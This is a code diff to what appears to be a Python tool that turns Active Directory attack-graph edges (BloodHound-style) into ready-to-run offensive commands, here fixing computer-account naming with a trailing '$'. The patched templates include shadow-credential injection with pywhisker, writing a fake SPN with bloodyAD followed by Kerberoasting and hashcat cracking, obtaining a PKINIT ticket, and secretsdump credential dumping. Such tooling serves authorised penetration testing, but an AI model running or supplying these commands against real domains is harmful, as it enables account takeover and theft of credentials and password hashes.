@@ -43,6 +43,14 @@ def _parse(label: str, kind: str = "") -> dict:
     return {"short": label, "domain": "<DOMAIN>", "fqdn": label}
 
 
+def _computer_identity(dst_name: str) -> str:
+    """Return a computer account identity in COMPUTER$@DOMAIN form so that
+    _parse() recovers the sAMAccountName (with the trailing '$') correctly.
+    """
+    p = _parse(dst_name)
+    return f"{p['short']}$@{p['domain']}"
+
+
 def _next_actor(
     rel_type: str,
     dst_name: str,
@@ -53,7 +61,7 @@ def _next_actor(
     user_kinds = ("users", "")
 
     if rel_type in ("ForceChangePassword", "AddKeyCredentialLink"):
-        return dst_name
+        return _computer_identity(dst_name) if dst_kind == "computers" else dst_name
     if rel_type in ("AllowedToDelegate", "AllowedToAct", "WriteAccountRestrictions"):
         act = _parse(current)
         return f"Administrator@{act['domain']}"
@@ -66,7 +74,9 @@ def _next_actor(
     if rel_type in ("ReadLAPSPassword", "SyncLAPSPassword"):
         return f"local Administrator on {dst_name}"
     if rel_type == "HasSession":
-        return dst_name  # steal the session owner's token
+        # In CE, HasSession goes user→computer, so dst is the host you can log into;
+        # the actor stays the user (no identity change).
+        return current
     if rel_type in ("AdminTo", "SQLAdmin"):
         # AdminTo via psexec → SYSTEM; SQLAdmin → xp_cmdshell → SYSTEM.
         return f"SYSTEM on {dst_name}"
@@ -283,13 +293,14 @@ def get_commands(
             ), na
 
         case "GenericWrite":
+            T_sam = f"{T}$" if dst_kind == "computers" else T
             return CommandSet(
                 f"Generic write on {TF} — shadow credentials or WriteSPN + Kerberoast.",
                 [
                     f"# Option 1 — shadow credentials:",
-                    f"pywhisker -d {D} -u '{A}' -p '{PASS}' --target '{T}' --action add --dc-ip {DC}",
+                    f"pywhisker -d {D} -u '{A}' -p '{PASS}' --target '{T_sam}' --action add --dc-ip {DC}",
                     f"# Option 2 — write fake SPN then Kerberoast:",
-                    f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set object '{T}' servicePrincipalName -v 'fake/blah'",
+                    f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set object '{T_sam}' servicePrincipalName -v 'fake/blah'",
                     f"impacket-GetUserSPNs '{D}/{A}:{PASS}' -dc-ip {DC} -request",
                     f"hashcat -m 13100 spn_hash.txt /usr/share/wordlists/rockyou.txt",
                 ],
@@ -385,14 +396,15 @@ def get_commands(
             ), na
 
         case "AddKeyCredentialLink":
+            T_sam = f"{T}$" if dst_kind == "computers" else T
             return CommandSet(
                 f"Shadow credentials on {TF} — add key credential, obtain TGT.",
                 [
-                    f"pywhisker -d {D} -u '{A}' -p '{PASS}' --target '{T}' --action add --dc-ip {DC}",
+                    f"pywhisker -d {D} -u '{A}' -p '{PASS}' --target '{T_sam}' --action add --dc-ip {DC}",
                     f"# pywhisker outputs the gettgtpkinit command, e.g.:",
-                    f"gettgtpkinit.py -cert-pfx '{T}.pfx' -pfx-pass '<PFX_PASS>' '{D}/{T}' '{T}.ccache'",
+                    f"gettgtpkinit.py -cert-pfx '{T}.pfx' -pfx-pass '<PFX_PASS>' '{D}/{T_sam}' '{T}.ccache'",
                     f"export KRB5CCNAME='{T}.ccache'",
-                    f"impacket-secretsdump -k -no-pass '{D}/{T}@{DC}'",
+                    f"impacket-secretsdump -k -no-pass '{D}/{T_sam}@{DC}'",
                 ],
             ), na
 
